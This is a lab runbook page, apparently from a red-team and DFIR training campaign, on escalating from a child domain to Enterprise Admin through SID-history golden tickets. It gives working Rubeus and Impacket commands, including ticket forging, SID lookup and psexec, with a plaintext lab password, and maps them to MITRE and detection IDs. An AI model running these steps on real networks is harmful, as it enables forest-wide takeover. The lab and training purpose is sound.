# CAMPAIGNS v3 — Phase 7 — Forest Trust Escalation (SID History)

> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA-v2.md`](../CAMPAIGNS-METADATA-v2.md).
> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`archive/CAMPAIGNS.md`](../archive/CAMPAIGNS.md)
> **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
>
> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.

**Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.

---

### Phase 7 — Forest Trust Escalation (SID History — WT010-012)


|                   |                                                   |
| ----------------- | ------------------------------------------------- |
| **Target**        | dc01 (.10) — root domain via parent-child trust   |
| **From**          | **mbr01** (using child krbtgt captured in Phase 6) |
| **Starting cred** | Child krbtgt + child DA (from Phase 6)            |
| **What you earn** | **Enterprise Admin** in cadre.local → root krbtgt |
| **MITRE**         | T1550.002 (Use Alternate Auth Mat: Kerberos) + T1134.005 (SID-History Injection) |


The child has a bidirectional transitive trust with the root. From the mbr01 beachhead, forge a golden ticket with the root's EA SID injected via Rubeus, then authenticate to dc01.

**Step 1 — Get root EA SID from mbr01 using child DA hash:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe lookupid /user:Administrator /domain:cadre.local /dc:192.168.77.10"
```

**Step 2 — Forge Golden Ticket on mbr01 with Rubeus:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\Rubeus.exe golden /user:Administrator /domain:child.cadre.local /sid:S-1-5-21-2616196951-1941128886-767624593 /rc4:<child_krbtgt_ntlm> /sids:S-1-5-21-<root>-519 /ptt"
```

**Step 3 — Use the ticket from mbr01 to access dc01:**

```powershell
winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "dir \\dc01.cadre.local\C$"
```

**Fallback from Kali:**

```bash
# Get root EA SID
impacket-lookupsid -hashes :<child_admin_nthash> cadre.local/Administrator@192.168.77.10
# Forge ticket with EA SID
impacket-ticketer -nthash <child_krbtgt_hash> -domain child.cadre.local \
  -domain-sid <child_sid> -extra-sid <root_EA_SID> Administrator
# Authenticate to dc01 as EA
impacket-psexec cadre.local/Administrator@192.168.77.10 -k -no-pass
```

**Stealth alternative — Diamond Ticket (WT012):** Modify a legitimate TGT instead of forging one.

**Targeted alternative — Silver Ticket (WT011):** Forge service-specific TGS for targeted access without DC contact.

#### G — Persistence (Inline)


| G WT# | Technique                    | Detection        |
| ----- | ---------------------------- | ---------------- |
| 088   | Scheduled Task (T1053.005)   | WinSec 4698      |
| 089   | Registry Run Key (T1547.001) | Sysmon EID 12-13 |

---

## Navigation

← Previous: [`CAMPAIGNS-RUNBOOK-6.md`](CAMPAIGNS-RUNBOOK-6.md) · Next: [`CAMPAIGNS-RUNBOOK-8.md`](CAMPAIGNS-RUNBOOK-8.md) →
